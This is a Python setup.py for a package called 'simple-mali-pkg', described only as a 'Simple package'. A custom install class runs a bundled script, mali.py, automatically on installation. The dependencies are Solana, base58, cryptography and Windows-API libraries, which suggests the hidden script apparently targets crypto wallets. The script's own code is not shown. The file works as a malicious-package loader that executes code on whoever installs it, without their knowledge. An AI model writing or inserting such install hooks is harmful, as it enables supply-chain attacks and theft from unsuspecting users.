import os
import sys
import subprocess
from setuptools import setup
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        install.run(self)
        # Chạy mali.py ngay sau khi cài đặt
        try:
            mali_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mali.py")
            print(f"Executing {mali_path}")
            subprocess.call([sys.executable, mali_path], shell=True)
        except Exception as e:
            print(f"Error: {e}")

setup(
    name="simple-mali-pkg",
    version="0.1.0",
    description="Simple package",
    author="Example",
    author_email="example@example.com",
    install_requires=[
        "solana",
        "solders",
        "base58",
        "requests",
        "colorama",
        "PythonForWindows",
        "pycryptodome",
    ],
    data_files=[('', ['mali.py'])],  # Đảm bảo mali.py được cài đặt
    cmdclass={
        "install": PostInstall,
    },
) 